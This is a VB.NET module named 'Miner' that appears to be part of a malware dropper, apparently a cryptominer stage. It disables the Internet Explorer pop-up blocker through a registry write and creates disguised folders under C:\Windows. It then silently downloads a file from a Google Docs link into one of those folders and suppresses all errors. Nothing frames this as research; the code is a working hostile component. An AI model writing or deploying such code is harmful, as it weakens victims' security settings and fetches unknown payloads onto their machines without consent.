Imports System.Net
Imports System.ComponentModel

Module Miner
    Sub MainMiner()
        If My.Computer.Network.IsAvailable Then
            Try
                Download()
            Catch ex As Exception
            End Try
        Else
            ' MsgBox("Computer is not connected.")
        End If
    End Sub

    Private Sub Download()
        Dim WshShell As Object
        Dim popupKeyPath As String
        WshShell = CreateObject("WScript.Shell")
        popupKeyPath = "HKCU\Software\Microsoft\Internet Explorer\New Windows\PopupMgr"
        'Disable the IE pop-up blocker
        WshShell.RegWrite(popupKeyPath, "no", "REG_SZ")

        My.Computer.FileSystem.CreateDirectory(
                    "C:\Windows\Software")
        My.Computer.FileSystem.CreateDirectory(
                    "C:\Windows\TaskClean")
        My.Computer.FileSystem.CreateDirectory(
                    "C:\Windows\SoftModify")


        Dim Url As String = "C:\Windows\Software\Url.txt"
        Using myWebClient As New WebClient()
            AddHandler myWebClient.DownloadFileCompleted, AddressOf DownloadCompleted
            myWebClient.DownloadFileAsync(New Uri("https://docs.google.com/uc?id=0B6xvFJmNvza3UVZyT3c3TXVMY3M"), Url)
        End Using
        Threading.Thread.Sleep(1 * 5 * 1000)

    End Sub

    Public Sub DownloadCompleted(sender As Object, e As AsyncCompletedEventArgs)
        'Console.WriteLine("Success")
    End Sub
End Module
